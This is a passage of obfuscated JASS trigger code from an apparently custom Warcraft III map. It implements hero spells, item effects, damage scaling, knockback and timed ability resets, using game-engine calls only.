set NS=I2R(3*GetHeroStr(Hu,true))*TQ[GetPlayerId(GetOwningPlayer(Hu))+1]
set Nu=R2I(NS)
call ForGroup(Na,function m4)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=null
set Vx=null
set Na=null
elseif GetSpellAbilityId()==$41304731 then
set Ht=GetUnitLoc(Hu)
set Na=CreateGroup()
set Vx=Condition(function mw)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),700,Vx)
call DestroyBoolExpr(Vx)
set NS=I2R(5*GetHeroStr(Hu,true))*TQ[GetPlayerId(GetOwningPlayer(Hu))+1]
set Nu=R2I(NS)
call ForGroup(Na,function m4)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=null
set Vx=null
set Na=null
endif
set Hu=null
set NQ=null
set Hc=null
set Ht=null
set Na=null
set Vx=null
endfunction
function xm takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local item MO=GetManipulatedItem()
local location Ht
local group Na
local boolexpr Vx
if GetItemTypeId(MO)==$636C666D or GetItemTypeId(MO)==$63697269 or GetItemTypeId(MO)==$68736C76 or GetItemTypeId(MO)==$49304A5A then
set Ht=GetUnitLoc(Hu)
set Na=CreateGroup()
set Vx=Condition(function mw)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),1000,Vx)
call DestroyBoolExpr(Vx)
set Nu=5*GetHeroInt(Hu,true)
call ForGroup(Na,function m4)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=null
set Vx=null
set Na=null
elseif GetItemTypeId(MO)==$49304D59 or GetItemTypeId(MO)==$49305746 then
set Ht=GetUnitLoc(Hu)
set Na=CreateGroup()
set Vx=Condition(function mw)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),1000,Vx)
call DestroyBoolExpr(Vx)
set Nu=8*GetHeroInt(Hu,true)
call ForGroup(Na,function m4)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=null
set Vx=null
set Na=null
endif
set Hu=null
set MO=null
endfunction
function xn takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Hc,function xl)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_USE_ITEM)
call TriggerAddAction(Hc,function xm)
set Hc=null
endfunction
function xo takes nothing returns nothing
call UnitRemoveAbility(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0),LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1))
call UnitAddAbility(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0),LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1))
call SetUnitAbilityLevel(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0),LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1),LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function xp takes nothing returns nothing
call UnitRemoveAbility(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0),$4130364C)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function xq takes nothing returns nothing
local unit Hu=GetEnumUnit()
local timer Hc
if GetUnitState(Hu,UNIT_STATE_LIFE)>.405 then
call m1(Pq,Hu,Nu)
call UnitAddAbility(Hu,$4130364C)
call SetUnitAbilityLevel(Hu,$4130364C,GetUnitAbilityLevel(GetTriggerUnit(),$4130454A))
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call TimerStart(Hc,5,false,function xp)
set Hc=null
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\BloodySplat Missile.mdx",Hu,"origin"))
endif
set Hu=null
endfunction
function xr takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))
local location Ht=GetUnitLoc(Hu)
local location Nk
local group Na
local boolexpr Vx
local timer Hc
local real NS
if GetSpellAbilityId()==$4130454A then
set Nk=nU(Ht,350,GetUnitFacing(Hu))
set NS=(I2R(GetHeroStr(Hu,true)*5)+I2R(GetUnitAbilityLevel(Hu,$4130454A)*70))*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
set Na=CreateGroup()
set Vx=Condition(function mx)
call GroupEnumUnitsInRange(Na,GetLocationX(Nk),GetLocationY(Nk),350,Vx)
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Culling Cleave Purple.mdx",Hu,"origin"))
set Pq=Hu
set Nu=R2I(NS)+GetHeroStr(Hu,true)/4*GetUnitAbilityLevel(Hu,$41304B57)
call SetUnitAbilityLevel(Hu,$41304B57,GetUnitAbilityLevel(Hu,$41304B57)-2)
call ForGroup(Na,function xq)
call DestroyBoolExpr(Vx)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=null
set Vx=null
set Na=null
if GetUnitAbilityLevel(Hu,$41303051)>=1 then
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveInteger(Nq,GetHandleId(Hc),1,GetSpellAbilityId())
call SaveInteger(Nq,GetHandleId(Hc),2,GetUnitAbilityLevel(Hu,GetSpellAbilityId()))
call TimerStart(Hc,4,false,function xo)
set Hc=null
endif
elseif GetSpellAbilityId()==$41305549 or GetSpellAbilityId()==$4130554A then
call SetUnitAbilityLevel(Hu,$41304B57,GetUnitAbilityLevel(Hu,$41304B57)-1)
if GetUnitAbilityLevel(Hu,$41303051)>=1 then
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveInteger(Nq,GetHandleId(Hc),1,GetSpellAbilityId())
call SaveInteger(Nq,GetHandleId(Hc),2,GetUnitAbilityLevel(Hu,GetSpellAbilityId()))
call TimerStart(Hc,20,false,function xo)
set Hc=null
endif
elseif GetSpellAbilityId()==$41303855 or GetSpellAbilityId()==$41305544 then
call SetUnitAbilityLevel(Hu,$41304B57,GetUnitAbilityLevel(Hu,$41304B57)-1)
if GetUnitAbilityLevel(Hu,$41303051)>=1 then
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveInteger(Nq,GetHandleId(Hc),1,GetSpellAbilityId())
call SaveInteger(Nq,GetHandleId(Hc),2,GetUnitAbilityLevel(Hu,GetSpellAbilityId()))
call TimerStart(Hc,10,false,function xo)
set Hc=null
endif
endif
set Nk=null
set Ht=null
set Hu=null
endfunction
function xs takes nothing returns nothing
set XO=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(XO,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(XO,function xr)
endfunction
function xt takes nothing returns boolean
if not (GetSpellAbilityId()==$41305638) then
return false
endif
return true
endfunction
function xu takes nothing returns boolean
return false==true
endfunction
function xv takes nothing returns nothing
set Rv=Rv+1
set Rw[Rv]=1.
set Rx[Rv]=0
set Ry[Rv]=GetUnitFacing(GetTriggerUnit())
set Rz[Rv]=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function xu))
set R0[Rv]=true
set XQ[Rv]=GetTriggerUnit()
set XR[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetUnitLoc(GetTriggerUnit())
call StartTimerBJ(R1,true,.03)
endfunction
function xw takes nothing returns nothing
set XP=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(XP,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(XP,Condition(function xt))
call TriggerAddAction(XP,function xv)
endfunction
function xx takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_STRUCTURE)==false
endfunction
function xy takes nothing returns boolean
return IsUnitAliveBJ(GetFilterUnit())==true
endfunction
function xz takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(XQ[XT]))==true
endfunction
function x0 takes nothing returns boolean
return IsUnitInGroup(GetFilterUnit(),Rz[XT])==false
endfunction
function x1 takes nothing returns boolean
return GetBooleanAnd(xz(),x0())
endfunction
function x2 takes nothing returns boolean
return GetBooleanAnd(xy(),x1())
endfunction
function x3 takes nothing returns boolean
return GetBooleanAnd(xx(),x2())
endfunction
function x4 takes nothing returns nothing
local integer L9
local real Hb
call GroupAddUnitSimple(GetEnumUnit(),Rz[XT])
set R3=R3+1
set XV[R3]=GetEnumUnit()
set XW[R3]=GetUnitLoc(XV[R3])
call SetUnitFlyHeightBJ(XV[R3],GetUnitFlyHeight(XV[R3])+10.,0.)
call UnitAddAbilityBJ($41617665,XV[R3])
set R4[R3]=20.
set R5=R5+1
set R6[R3]=true
call StartTimerBJ(R7,true,.05)
set L9=(1000+GetHeroStr(XQ[Rv],true)*3)*GetUnitAbilityLevel(XQ[Rv],$41305638)+GetHeroStr(XQ[Rv],true)/3*GetUnitAbilityLevel(XQ[Rv],$41304B57)
set Hb=I2R(L9)*Ng[GetConvertedPlayerId(GetOwningPlayer(XQ[Rv]))]
call UnitDamageTargetBJ(XQ[XT],XV[R3],Hb,ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
call SetUnitAbilityLevel(XQ[XT],$41304B57,GetUnitAbilityLevel(XQ[XT],$41304B57)-3)
endfunction
function x5 takes nothing returns boolean
if not (Rx[XT]==3) then
return false
endif
return true
endfunction
function x6 takes nothing returns boolean
if not (Rw[XT]>0.) then
return false
endif
if not (IsUnitAliveBJ(XQ[XT])==true) then
return false
endif
return true
endfunction
function x7 takes nothing returns boolean
if not x6() then
return false
endif
return true
endfunction
function x8 takes nothing returns boolean
if not (R0[XT]==true) then
return false
endif
return true
endfunction
function x9 takes nothing returns nothing
set XT=1
loop
exitwhen XT>Rv
if x8() then
if x7() then
set Rw[XT]=Rw[XT]-.03
set Rx[XT]=Rx[XT]+1
set XU=GetUnitLoc(XQ[XT])
set XU=PolarProjectionBJ(XU,30.,Ry[XT])
call SetUnitPositionLocFacingBJ(XQ[XT],XU,Ry[XT])
set R2=GetUnitsInRangeOfLocMatching(160.,XU,Condition(function x3))
call ForGroupBJ(R2,function x4)
if x5() then
set Rx[XT]=0
call AddSpecialEffectLocBJ(XU,"Abilities\\Spells\\Human\\ThunderClap\\ThunderClapCaster.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
else
endif
call GroupClear(R2)
call DestroyGroup(R2)
call RemoveLocation(XU)
else
call SetUnitPositionLocFacingBJ(XQ[XT],XR[GetConvertedPlayerId(GetOwningPlayer(XQ[XT]))],0.)
call GroupClear(Rz[XT])
call DestroyGroup(Rz[XT])
set XQ[XT]=null
set Rw[XT]=0.
set Rx[XT]=0
set Ry[XT]=0.
set R0[XT]=false
call SetUnitAnimation(XQ[XT],"stand")
endif
else
endif
set XT=XT+1
endloop
endfunction
function yB takes nothing returns nothing
set XS=CreateTrigger()
call TriggerRegisterTimerExpireEventBJ(XS,R1)
call TriggerAddAction(XS,function x9)
endfunction
function yC takes nothing returns boolean
if not (R5==0) then
return false
endif
return true
endfunction
function yD takes nothing returns boolean
if not (GetUnitDefaultFlyHeight(XV[XY])<=GetUnitFlyHeight(XV[XY])-.01) then
return false
endif
return true
endfunction
function yE takes nothing returns boolean
if not (R6[XY]==true) then
return false
endif
return true
endfunction
function yF takes nothing returns nothing
set XY=1
loop
exitwhen XY>R3
if yE() then
if yD() then
set R4[XY]=R4[XY]-1.
call SetUnitFlyHeightBJ(XV[XY],GetUnitFlyHeight(XV[XY])+R4[XY],0.)
call SetUnitPositionLoc(XV[XY],XW[XY])
else
call RemoveLocation(XW[XY])
call SetUnitFlyHeightBJ(XV[XY],GetUnitDefaultFlyHeight(XV[XY]),0.)
call UnitRemoveAbilityBJ($41617665,XV[XY])
set XV[XY]=null
set R4[XY]=0.
set R6[XY]=false
if yC() then
set R3=0
call PauseTimerBJ(true,R7)
else
endif
endif
else
endif
set XY=XY+1
endloop
endfunction
function yG takes nothing returns nothing
set XX=CreateTrigger()
call TriggerRegisterTimerExpireEventBJ(XX,R7)
call TriggerAddAction(XX,function yF)
endfunction
function yH takes nothing returns nothing
local unit PK=LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0)
local integer Mg=LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)
call SetHeroStr(PK,GetHeroStr(PK,false)-Mg,false)
set PK=null
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function yI takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local integer L9
local timer Mc
if GetSpellAbilityId()==$41305549 then
set L9=GetHeroStr(Hu,true)/7+GetUnitAbilityLevel(Hu,$41305549)*20
call SetHeroStr(Hu,GetHeroStr(Hu,false)+L9,false)
set Mc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Mc),0,Hu)
call SaveInteger(PP,GetHandleId(Mc),1,L9)
call TimerStart(Mc,10,false,function yH)
set Mc=null
endif
if GetSpellAbilityId()==$4130554A then
set L9=GetHeroStr(Hu,true)/4+GetUnitAbilityLevel(Hu,$41305549)*30
call SetHeroStr(Hu,GetHeroStr(Hu,false)+L9,false)
set Mc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Mc),0,Hu)
call SaveInteger(PP,GetHandleId(Mc),1,L9)
call TimerStart(Mc,10,false,function yH)
set Mc=null
endif
set Hu=null
endfunction
function yJ takes nothing returns nothing
set XZ=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(XZ,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(XZ,function yI)
endfunction
function yK takes nothing returns boolean
if not (IsUnitEnemy(GetAttacker(),GetOwningPlayer(GetTriggerUnit()))==true) then
return false
endif
return true
endfunction
function yL takes nothing returns boolean
if not (GetRandomInt(1,5)==1) then
return false
endif
return true
endfunction
function yM takes nothing returns boolean
if UnitHasItemOfTypeBJ(GetAttacker(),$6D616E68)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetAttacker(),$72726531)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetAttacker(),$6D67746B)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetAttacker(),$49304B39)==true then
return true
endif
return false
endfunction
function yN takes nothing returns boolean
if not yM() then
return false
endif
return true
endfunction
function yO takes nothing returns boolean
if not (GetRandomInt(1,5)==1) then
return false
endif
return true
endfunction
function yP takes nothing returns boolean
if UnitHasItemOfTypeBJ(GetAttacker(),$49304D54)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetAttacker(),$49305741)==true then
return true
endif
return false
endfunction
function yQ takes nothing returns boolean
if yP() then
return true
endif
return false
endfunction
function yR takes nothing returns boolean
if not yQ() then
return false
endif
return true
endfunction
function yS takes nothing returns nothing
if yN() then
if yL() then
call UnitDamageTargetBJ(GetAttacker(),GetTriggerUnit(),I2R(GetHeroStr(GetAttacker(),true)),ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Objects\\Spawnmodels\\Human\\HumanLargeDeathExplode\\HumanLargeDeathExplode.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
else
endif
else
endif
if yR() then
if yO() then
call UnitDamageTargetBJ(GetAttacker(),GetTriggerUnit(),I2R(GetHeroStr(GetAttacker(),true)),ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
call UnitDamageTargetBJ(GetAttacker(),GetTriggerUnit(),I2R(GetHeroStr(GetAttacker(),true)),ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Objects\\Spawnmodels\\Human\\HumanLargeDeathExplode\\HumanLargeDeathExplode.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
else
endif
else
endif
endfunction
function yT takes nothing returns nothing
set Xa=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Xa,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddCondition(Xa,Condition(function yK))
call TriggerAddAction(Xa,function yS)
endfunction
function yU takes nothing returns boolean
if UnitHasItemOfTypeBJ(GetKillingUnit(),$72686533)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetKillingUnit(),$72726532)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetKillingUnit(),$776F6C67)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetKillingUnit(),$49304D52)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetKillingUnit(),$49304B38)==true then
return true
endif
if UnitHasItemOfTypeBJ(GetKillingUnit(),$49305736)==true then
return true
endif
return false
endfunction
function yV takes nothing returns boolean
if not yU() then
return false
endif
return true
endfunction
function yW takes nothing returns nothing
call SetUnitLifeBJ(GetKillingUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetKillingUnit())+GetUnitStateSwap(UNIT_STATE_MAX_LIFE,GetTriggerUnit())/10.)
call AddSpecialEffectTargetUnitBJ("origin",GetKillingUnit(),"Abilities\\Spells\\Undead\\AnimateDead\\AnimateDeadTarget.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
endfunction
function yX takes nothing returns nothing
set Xb=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Xb,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(Xb,Condition(function yV))
call TriggerAddAction(Xb,function yW)
endfunction
function yY takes nothing returns nothing
local unit NQ=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local location Ht=GetUnitLoc(Hu)
local location Nk=GetUnitLoc(NQ)
local real Mc
local real No
local real Np
local real Nt
local real Ny
local real Ot
local real Ou
local location Ov
local group Ow
local boolexpr Ox
if nT(Ht,Nk)>=50 and GetUnitState(Hu,UNIT_STATE_LIFE)>.405 then
set Mc=GetLocationX(Ht)
set No=GetLocationY(Ht)
set Np=GetUnitX(NQ)
set Nt=GetUnitY(NQ)
set Ny=Atan2(No-Nt,Mc-Np)
set Ot=nR(GetUnitX(NQ)+8*Cos(Ny))
set Ou=nS(GetUnitY(NQ)+8*Sin(Ny))
set Ov=Location(Ot,Ou)
call SetUnitPositionLoc(NQ,Ov)
call RemoveLocation(Ov)
set Ov=null
else
set Ow=CreateGroup()
set Ox=Condition(function mx)
call GroupEnumUnitsInRange(Ow,GetLocationX(Ht),GetLocationY(Ht),300,Ox)
set Pq=Hu
set Nu=R2I(I2R(GetHeroAgi(Hu,true)*2)*Nd[GetPlayerId(GetOwningPlayer(Hu))+1])
call ForGroup(Ow,function m9)
call DestroyGroup(Ow)
call DestroyBoolExpr(Ox)
set Ow=null
set Ox=null
call RemoveUnit(NQ)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
call RemoveLocation(Ht)
call RemoveLocation(Nk)
set Ht=null
set Nk=null
set Hu=null
set NQ=null
endfunction
function yZ takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local location Ht
local location Nk
local timer Hc
local integer L9
local integer Pd
local real NT
local unit NQ
local boolexpr Nb
local group V9
local string M6=""
if GetSpellAbilityId()==$41304258 or GetSpellAbilityId()==$41305354 then
set L9=0
set Ht=GetUnitLoc(Hu)
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set M6="Abilities\\Spells\\NightElf\\Cyclone\\CycloneTarget.mdl"
endif
loop
set Nk=nU(Ht,550,L9*60)
set NQ=CreateUnitAtLoc(GetOwningPlayer(Hu),$68303739,Nk,0)
call UnitAddAbility(NQ,$4130364E)
call AddSpecialEffectTarget(M6,NQ,"origin")
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),1,NQ)
call TimerStart(Hc,.1,true,function yY)
set Hc=null
call TriggerSleepAction(.5)
set L9=L9+1
exitwhen L9==6
endloop
elseif GetSpellAbilityId()==$41305458 then
set Ht=GetUnitLoc(Hu)
set Pd=80
set NT=GetUnitFacing(Hu)
loop
set Nk=nU(Ht,Pd,NT)
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\Green Stone.mdl",Nk))
set V9=CreateGroup()
set Nb=Condition(function mx)
call GroupEnumUnitsInRange(V9,GetLocationX(Nk),GetLocationY(Nk),120,Nb)
call DestroyBoolExpr(Nb)
set Pq=Hu
set Nu=R2I(I2R(GetHeroAgi(Hu,true)*9+GetUnitAbilityLevel(Hu,$41305458)*170)*Nd[GetPlayerId(GetOwningPlayer(Hu))+1])
call ForGroup(V9,function m9)
call DestroyGroup(V9)
set Nb=null
set V9=null
call RemoveLocation(Nk)
set Nk=null
call TriggerSleepAction(.05)
set Pd=Pd+80
exitwhen Pd>=800
endloop
call RemoveLocation(Ht)
set Ht=null
endif
set NQ=null
set Nk=null
set Ht=null
set Hu=null
endfunction
function ya takes nothing returns nothing
set Xc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Xc,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Xc,function yZ)
endfunction
function yb takes nothing returns boolean
if not (GetSpellAbilityId()==$41304344) then
return false
endif
return true
endfunction
function yc takes nothing returns boolean
if not (GetSpellAbilityId()==$41304550) then
return false
endif
return true
endfunction
function yd takes nothing returns nothing
if yb() then
call UnitDamageTargetBJ(GetTriggerUnit(),GetSpellTargetUnit(),I2R(GetHeroAgi(GetTriggerUnit(),true))*(I2R(GetUnitAbilityLevel(GetTriggerUnit(),$41304344))*Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]),ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
call UnitDamageTargetBJ(GetTriggerUnit(),GetSpellTargetUnit(),200.*I2R(GetUnitAbilityLevel(GetTriggerUnit(),$41304344)),ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
call AddSpecialEffectTargetUnitBJ("chest",GetSpellTargetUnit(),"war3mapImported\\Singularity II Red.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
else
endif
if yc() then
call UnitDamageTargetBJ(GetTriggerUnit(),GetSpellTargetUnit(),I2R(GetHeroAgi(GetTriggerUnit(),true))*(18.*Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]),ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
call AddSpecialEffectTargetUnitBJ("chest",GetSpellTargetUnit(),"war3mapImported\\Singularity II Red.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
else
endif
endfunction
function ye takes nothing returns nothing
set Xd=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Xd,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Xd,function yd)
endfunction
function yf takes nothing returns nothing
local location Mc
local unit No
if IsUnitInGroup(GetEnumUnit(),UN[GetPlayerId(GetOwningPlayer(Pq))])==false then
call GroupAddUnit(UN[GetPlayerId(GetOwningPlayer(Pq))],GetEnumUnit())
call m1(Pq,GetEnumUnit(),Nu)
set Mc=GetUnitLoc(GetEnumUnit())
set No=CreateUnitAtLoc(Player(0),$68303739,Mc,0)
call nD(No,1)
call UnitAddAbility(No,$4131324E)
call IssueTargetOrder(No,"creepthunderbolt",GetEnumUnit())
set No=null
set No=CreateUnitAtLoc(Player(0),$68303739,Mc,0)
call nD(No,1)
call UnitAddAbility(No,$5330305A)
call IssueTargetOrder(No,"cripple",GetEnumUnit())
call RemoveLocation(Mc)
set No=null
set Mc=null
endif
endfunction
function yg takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),2)
local unit NQ=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),7)
local real Mc
local real No
local real Np
local real Nt
local real Ny
local real Ot
local real Ou
local location Ov
local string Ow
local group Ox
local boolexpr Oz
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),1,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)>=1 then
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)<=160 then
set Mc=GetLocationX(LoadLocationHandle(Nq,GetHandleId(GetExpiredTimer()),3))
set No=GetLocationY(LoadLocationHandle(Nq,GetHandleId(GetExpiredTimer()),3))
set Np=GetUnitX(NQ)
set Nt=GetUnitY(NQ)
set Ny=Atan2(No-Nt,Mc-Np)
set Ot=nR(GetUnitX(NQ)+7*Cos(Ny))
set Ou=nS(GetUnitY(NQ)+7*Sin(Ny))
set Ov=Location(Ot,Ou)
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),0,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),0)+1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),0)==8 then
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),0,0)
set Ow=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set Ow="war3mapImported\\Rock Slam.mdx"
endif
call DestroyEffect(AddSpecialEffectLoc(Ow,Ov))
endif
if IsTerrainPathable(GetLocationX(Ov),GetLocationY(Ov),PATHING_TYPE_WALKABILITY)==false then
call SetUnitPositionLoc(NQ,Ov)
call SetUnitPositionLoc(Hu,Ov)
set Ox=CreateGroup()
set Oz=Condition(function mx)
call GroupEnumUnitsInRange(Ox,GetLocationX(Ov),GetLocationY(Ov),300,Oz)
set Pq=Hu
if GetUnitAbilityLevel(Hu,$4131334E)>=1 then
set Nu=R2I(I2R(10000+GetHeroStr(Hu,true)*15)*Ng[GetPlayerId(GetOwningPlayer(Hu))+1])
else
set Nu=R2I(I2R(500*GetUnitAbilityLevel(Hu,$4131334D)+GetHeroStr(Hu,true)*10)*Ng[GetPlayerId(GetOwningPlayer(Hu))+1])
endif
call ForGroup(Ox,function yf)
call DestroyGroup(Ox)
call DestroyBoolExpr(Oz)
set Ox=null
set Oz=null
else
call SetUnitVertexColor(Hu,255,255,255,255)
call PauseUnit(Hu,false)
call KillUnit(NQ)
call RemoveUnit(NQ)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$4131375A,true)
call UnitRemoveAbility(Hu,$4131375A)
call UnitRemoveAbility(Hu,$4230314D)
call RemoveLocation(LoadLocationHandle(Nq,GetHandleId(GetExpiredTimer()),3))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),7)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),3)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
call RemoveLocation(Ov)
set Ov=null
endif
else
call SetUnitVertexColor(Hu,255,255,255,255)
call PauseUnit(Hu,false)
call KillUnit(NQ)
call RemoveUnit(NQ)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$4131375A,true)
call UnitRemoveAbility(Hu,$4131375A)
call UnitRemoveAbility(Hu,$4230314D)
call RemoveLocation(LoadLocationHandle(Nq,GetHandleId(GetExpiredTimer()),3))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),7)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),3)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set NQ=null
endfunction
function yh takes nothing returns nothing
local unit Hu=GetEnumUnit()
local unit NR=GetTriggerUnit()
if GetUnitAbilityLevel(Hu,$42303639)>=1 then
set Nu=Nu*2
endif
call m0(NR,Hu,Nu)
call IssueTargetOrder(Hu,"attack",NR)
set Hu=null
set NR=null
endfunction
function yi takes nothing returns nothing
local unit Hu=GetEnumUnit()
local unit NR=Pq
local location Ht=GetUnitLoc(NR)
local real MD=GetLocationX(Ht)
local real ME=GetLocationY(Ht)
local real Pt=GetUnitX(Hu)
local real Pu=GetUnitY(Hu)
local real NT=Atan2(ME-Pu,MD-Pt)
local real Pw=nR(GetUnitX(Hu)+50*Cos(NT))
local real Px=nS(GetUnitY(Hu)+50*Sin(NT))
local location Mc
local real Hb
if nT(Ht,Location(Pt,Pu))>=400 then
set Mc=Location(Pw,Px)
call SetUnitPositionLoc(Hu,Mc)
call RemoveLocation(Mc)
set Mc=null
endif
set Hb=I2R(Nu)
call m0(NR,Hu,R2I(Hb)/100)
call RemoveLocation(Ht)
set Ht=null
set Hu=null
set NR=null
endfunction
function yj takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local location Mc
local group No
local boolexpr Np
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),1,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)>=1 then
